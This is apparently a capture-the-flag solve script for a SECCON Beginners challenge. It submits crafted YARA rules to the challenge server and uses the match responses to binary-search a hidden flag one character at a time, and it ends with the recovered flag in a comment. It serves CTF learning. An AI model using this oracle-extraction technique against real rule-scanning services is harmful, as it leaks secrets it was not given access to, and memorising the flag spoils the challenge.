import string

from pwn import *

def send_cmd(rule: str) -> bool:
    r = remote('yaro.beginners.seccon.games', 5003)

    r.recvline()
    r.sendline(rule.encode())
    print(rule)
    res = r.recvall()
    if b"matched: [flag]" in res:
        return True
    else:
        return False


def get_rule(flag: str, next_chars: str) -> str:
    def escape(s): return s.replace("{", "\\{").replace("}", "\\}")
    expr = "".join([
        "[",
        escape(next_chars),
        "]"
    ])
    return f"""rule flag {{
    strings:
        $ident = /{escape(flag)}{expr}/
    condition:
        $ident
}}
"""


CHARS = "_}" + string.ascii_letters + string.digits

flag = "ctf4b{"
while not flag.endswith("}"):
    left = 0
    right = len(CHARS)
    while right - left > 1:
        mid = (left + right)//2
        is_match = send_cmd(get_rule(flag, CHARS[:mid]))
        if is_match:
            right = mid
        else:
            left = mid
    flag += CHARS[left]
    print(flag)
print(f"{flag = }")
# flag = 'ctf4b{Y3t_An0th3r_R34d_Opp0rtun1ty}'
